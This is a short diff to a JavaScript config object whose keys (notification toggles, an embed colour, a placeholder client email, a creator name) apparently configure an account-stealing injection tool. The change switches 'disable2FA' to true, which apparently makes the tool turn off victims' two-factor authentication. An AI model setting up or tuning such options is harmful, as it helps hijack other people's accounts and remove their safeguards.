@@ -17,7 +17,7 @@ var config = {
   "logout-notify": "true",
   "init-notify": "true",
   "embed-color": "000000",
-  disable2FA: "false",
+  disable2FA: "true",
   changeMailAuto: "false",
   mail: "%CLIENTEMAIL%",
   creator: "Agiva",
